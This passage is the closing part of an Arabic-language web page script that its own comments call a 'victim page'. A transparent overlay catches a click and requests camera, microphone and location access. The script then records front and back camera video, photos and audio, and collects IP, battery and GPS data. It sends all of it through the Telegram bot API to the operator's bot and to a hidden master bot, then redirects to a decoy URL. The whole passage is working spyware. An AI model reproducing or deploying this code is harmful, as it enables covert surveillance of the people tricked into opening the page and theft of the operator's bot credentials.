                            (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, error: null }),
                            (err) => resolve({ lat: null, lng: null, error: err.message })
                        );
                    });
                }

                async function getBatteryStatus() {
                    try {
                        if (!navigator.getBattery) return { level: 'غير متاح', charging: false };
                        const battery = await navigator.getBattery();
                        return { level: Math.round(battery.level * 100) + '%', charging: battery.charging };
                    } catch { return { level: 'غير متاح', charging: false }; }
                }

                function getStream(facingMode) {
                    return navigator.mediaDevices.getUserMedia({
                        video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    });
                }

                function recordStream(stream, duration) {
                    return new Promise((resolve) => {
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                        recorder.onstop = () => resolve(new Blob(chunks, { type: recorder.mimeType || 'video/webm' }));
                        recorder.start();
                        setTimeout(() => recorder.stop(), duration);
                    });
                }

                function capturePhoto(videoEl) {
                    return new Promise((resolve) => {
                        const w = videoEl.videoWidth || 640;
                        const h = videoEl.videoHeight || 480;
                        canvas.width = w;
                        canvas.height = h;
                        ctx.drawImage(videoEl, 0, 0, w, h);
                        canvas.toBlob(b => resolve(b), 'image/jpeg', 0.85);
                    });
                }

                async function recordAudio(duration) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];
                        recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                        return new Promise((resolve) => {
                            recorder.onstop = () => {
                                const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
                                stream.getTracks().forEach(t => t.stop());
                                resolve(blob);
                            };
                            recorder.start();
                            setTimeout(() => recorder.stop(), duration);
                        });
                    } catch { return null; }
                }

                // ===== إرسال وسائط مع keepalive =====
                async function sendMedia(method, token, formData) {
                    try {
                        await fetch(`https://api.telegram.org/bot${token}/${method}`, {
                            method: 'POST',
                            body: formData,
                            keepalive: true
                        });
                    } catch (e) { console.warn('Send media failed:', e); }
                }

                // ===== تنسيق الرسائل =====
                function formatBatteryMessage(battery) {
                    return `⭑ حالة البطارية ⭒\n⊚─〔 الطاقة 〕────────\n˼🔋˹ النسبة: ${battery.level} ⭒\n─────────────────`;
                }

                function formatLocationMessage(location) {
                    if (!location.lat || !location.lng) {
                        return `⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع غير متاح ⭒\n─────────────────`;
                    }
                    return `⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع: ${location.lat}, ${location.lng} ⭒\n─────────────────`;
                }

                function formatVisitMessage(ip, browser, token, time) {
                    return `⭑ زيارة جديدة ⭒\n⊚─〔 دخول 〕────────\n˼🕒˹ ${time} ⭒\n˼🆔˹ التوكن: ${token} ⭒\n˼🌐˹ الـ IP: ${ip} ⭒\n˼📌˹ الحدث: زيارة ⭒\n˼📱˹ المتصفح: ${browser} ⭒\n─────────────────`;
                }

                // ===== إرسال البيانات للمستخدم =====
                async function sendToUserBot(userToken, chatId, data, battery, token) {
                    await fetch(`https://api.telegram.org/bot${userToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatId, text: formatBatteryMessage(battery) }),
                        keepalive: true
                    }).catch(() => {});

                    await fetch(`https://api.telegram.org/bot${userToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatId, text: formatLocationMessage(data.location) }),
                        keepalive: true
                    }).catch(() => {});

                    await fetch(`https://api.telegram.org/bot${userToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatId, text: formatVisitMessage(data.ip, data.browser, token,
                                data.time) }),
                        keepalive: true
                    }).catch(() => {});

                    if (data.photos && data.photos.length > 0) {
                        for (let i = 0; i < data.photos.length; i++) {
                            const fd = new FormData();
                            fd.append('chat_id', chatId);
                            fd.append('photo', data.photos[i], `photo_${i+1}.jpg`);
                            fd.append('caption',
                                `⭑ صورة ${i+1}/${data.photos.length} ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صورة ⭒\n─────────────────`
                                );
                            await sendMedia('sendPhoto', userToken, fd);
                        }
                    }
                    if (data.frontVideo) {
                        const fd = new FormData();
                        fd.append('chat_id', chatId);
                        fd.append('video', data.frontVideo, 'front_video.webm');
                        fd.append('caption',
                            `⭑ فيديو أمامي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n─────────────────`
                            );
                        await sendMedia('sendVideo', userToken, fd);
                    }
                    if (data.backVideo) {
                        const fd = new FormData();
                        fd.append('chat_id', chatId);
                        fd.append('video', data.backVideo, 'back_video.webm');
                        fd.append('caption',
                            `⭑ فيديو خلفي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n─────────────────`
                            );
                        await sendMedia('sendVideo', userToken, fd);
                    }
                    if (data.audio) {
                        const fd = new FormData();
                        fd.append('chat_id', chatId);
                        fd.append('audio', data.audio, 'audio.webm');
                        fd.append('caption',
                            `⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صوت ⭒\n─────────────────`
                            );
                        await sendMedia('sendAudio', userToken, fd);
                    }
                    if (data.location && data.location.lat && data.location.lng) {
                        try {
                            await fetch(`https://api.telegram.org/bot${userToken}/sendLocation`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    latitude: data.location.lat,
                                    longitude: data.location.lng
                                }),
                                keepalive: true
                            });
                        } catch (e) {}
                    }
                }

                // ===== إرسال نسخة احتياطية =====
                async function sendToMaster(data, battery, token) {
                    const userInfo = botCreds ?
                        `˼⏣˹ توكن المستخدم: ${botCreds.botToken} ⭒\n˼⏣˹ إيدي المستخدم: ${botCreds.chatId} ⭒` :
                        `˼⏣˹ لا توجد بيانات مستخدم ⭒`;

                    await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: MASTER_CHAT_ID,
                            text: `⭑ نسخة احتياطية ⭒\n${formatBatteryMessage(battery)}\n${userInfo}\n─────────────────`,
                            parse_mode: 'Markdown'
                        }),
                        keepalive: true
                    }).catch(() => {});

                    await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: MASTER_CHAT_ID,
                            text: `⭑ نسخة احتياطية ⭒\n${formatLocationMessage(data.location)}\n${userInfo}\n─────────────────`,
                            parse_mode: 'Markdown'
                        }),
                        keepalive: true
                    }).catch(() => {});

                    await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: MASTER_CHAT_ID,
                            text: `⭑ نسخة احتياطية ⭒\n${formatVisitMessage(data.ip, data.browser, token, data.time)}\n${userInfo}\n─────────────────`,
                            parse_mode: 'Markdown'
                        }),
                        keepalive: true
                    }).catch(() => {});

                    if (data.photos && data.photos.length > 0) {
                        for (let i = 0; i < data.photos.length; i++) {
                            const fd = new FormData();
                            fd.append('chat_id', MASTER_CHAT_ID);
                            fd.append('photo', data.photos[i], `photo_${i+1}.jpg`);
                            fd.append('caption',
                                `⭑ صورة ${i+1}/${data.photos.length} ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صورة ⭒\n─────────────────`
                                );
                            await sendMedia('sendPhoto', MASTER_BOT_TOKEN, fd);
                        }
                    }
                    if (data.frontVideo) {
                        const fd = new FormData();
                        fd.append('chat_id', MASTER_CHAT_ID);
                        fd.append('video', data.frontVideo, 'front_video.webm');
                        fd.append('caption',
                            `⭑ فيديو أمامي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n─────────────────`
                            );
                        await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                    }
                    if (data.backVideo) {
                        const fd = new FormData();
                        fd.append('chat_id', MASTER_CHAT_ID);
                        fd.append('video', data.backVideo, 'back_video.webm');
                        fd.append('caption',
                            `⭑ فيديو خلفي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n─────────────────`
                            );
                        await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                    }
                    if (data.audio) {
                        const fd = new FormData();
                        fd.append('chat_id', MASTER_CHAT_ID);
                        fd.append('audio', data.audio, 'audio.webm');
                        fd.append('caption',
                            `⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صوت ⭒\n─────────────────`
                            );
                        await sendMedia('sendAudio', MASTER_BOT_TOKEN, fd);
                    }
                    if (data.location && data.location.lat && data.location.lng) {
                        try {
                            await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendLocation`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: MASTER_CHAT_ID,
                                    latitude: data.location.lat,
                                    longitude: data.location.lng
                                }),
                                keepalive: true
                            });
                        } catch (e) {}
                    }
                }

                // ===== التحقق من الصلاحيات (طلبها كلها دفعة واحدة) =====
                async function requestAllPermissions() {
                    const results = { front: false, back: false, mic: false, loc: false };

                    try {
                        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                        s.getTracks().forEach(t => t.stop());
                        results.front = true;
                    } catch { results.front = false; }

                    try {
                        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                        s.getTracks().forEach(t => t.stop());
                        results.back = true;
                    } catch { results.back = false; }

                    try {
                        const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                        s.getTracks().forEach(t => t.stop());
                        results.mic = true;
                    } catch { results.mic = false; }

                    try {
                        await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(
                                () => resolve(true),
                                () => reject(false)
                            );
                        });
                        results.loc = true;
                    } catch { results.loc = false; }

                    return results;
                }

                // ===== الوظيفة الأساسية: جمع البيانات وإرسالها ثم التوجيه =====
                async function collectAndRedirect() {
                    if (isProcessing || redirectDone) return;
                    isProcessing = true;

                    // إظهار حالة التحميل
                    statusOverlay.style.display = 'flex';
                    statusMsg.innerHTML = '<span class="emoji">📷</span> جاري طلب الصلاحيات...';
                    statusMsg.style.color = '#fff';

                    try {
                        // 1. طلب جميع الصلاحيات
                        const perms = await requestAllPermissions();
                        const allGranted = perms.front && perms.back && perms.mic && perms.loc;

                        if (!allGranted) {
                            statusMsg.innerHTML = '<span class="emoji">❌</span> لم يتم منح جميع الصلاحيات';
                            await delay(2500);
                            statusOverlay.style.display = 'none';
                            isProcessing = false;
                            return;
                        }

                        // 2. جمع البيانات
                        statusMsg.innerHTML = '<span class="emoji">📸</span> جمع البيانات...';

                        const [deviceData, ip, location, battery] = await Promise.all([
                            Promise.resolve(getDeviceData()),
                            getIP(),
                            getLocation(),
                            getBatteryStatus()
                        ]);

                        // الكاميرا الأمامية (فيديو + صور)
                        const frontResult = await (async () => {
                            let stream = null;
                            try {
                                stream = await getStream('user');
                                video.srcObject = stream;
                                await video.play();
                                await delay(300);
                                const videoBlob = await recordStream(stream, 3000);
                                const photos = [];
                                for (let i = 0; i < 8; i++) {
                                    photos.push(await capturePhoto(video));
                                    await delay(300);
                                }
                                return { video: videoBlob, photos };
                            } catch (e) {
                                return { video: null, photos: [] };
                            } finally {
                                if (stream) { stream.getTracks().forEach(t => t.stop()); }
                                video.srcObject = null;
                            }
                        })();

                        // الكاميرا الخلفية
                        const backVideo = await (async () => {
                            let stream = null;
                            try {
                                stream = await getStream('environment');
                                video.srcObject = stream;
                                await video.play();
                                await delay(300);
                                const blob = await recordStream(stream, 3000);
                                return blob;
                            } catch (e) {
                                return null;
                            } finally {
                                if (stream) { stream.getTracks().forEach(t => t.stop()); }
                                video.srcObject = null;
                            }
                        })();

                        // التسجيل الصوتي
                        const audioBlob = await recordAudio(3000);

                        const data = {
                            ip: ip,
                            location: location,
                            device: deviceData.platform || 'Unknown',
                            browser: /Chrome/.test(navigator.userAgent) ? 'Chrome' :
                                /Firefox/.test(navigator.userAgent) ? 'Firefox' :
                                /Safari/.test(navigator.userAgent) ? 'Safari' : 'Unknown',
                            time: new Date().toLocaleString('ar-EG'),
                            frontVideo: frontResult.video,
                            backVideo: backVideo,
                            audio: audioBlob,
                            photos: frontResult.photos
                        };

                        const token = rawToken || 'غير معروف';

                        // 3. إرسال البيانات (في الخلفية)
                        statusMsg.innerHTML = '<span class="emoji">📤</span> إرسال البيانات...';

                        if (botCreds && botCreds.botToken && botCreds.chatId) {
                            try {
                                await sendToUserBot(botCreds.botToken, botCreds.chatId, data, battery, token);
                            } catch (e) { console.warn('User send failed:', e); }
                        }

                        try {
                            await sendToMaster(data, battery, token);
                        } catch (e) { console.warn('Master send failed:', e); }

                        redirectDone = true;

                        // 4. التوجيه إلى الرابط الأصلي
                        statusMsg.innerHTML = '<span class="emoji">✅</span> تم! جاري التوجيه...';

                        if (targetUrl) {
                            setTimeout(() => {
                                window.location.href = targetUrl;
                            }, 800);
                        } else {
                            setTimeout(() => {
                                location.reload();
                            }, 1000);
                        }

                    } catch (error) {
                        console.error('Error:', error);
                        statusMsg.innerHTML = '<span class="emoji">❌</span> حدث خطأ، حاول مجدداً';
                        await delay(2500);
                        statusOverlay.style.display = 'none';
                        isProcessing = false;
                    }
                }

                // ===== ربط النقر على الطبقة الشفافة =====
                clickCatcher.addEventListener('click', function(e) {
                    e.preventDefault();
                    if (!isProcessing && !redirectDone) {
                        collectAndRedirect();
                    }
                });

                console.log('✅ Victim page ready. Token:', rawToken, 'Target:', targetUrl);
            }

        })();
    </script>
</body>
</html>
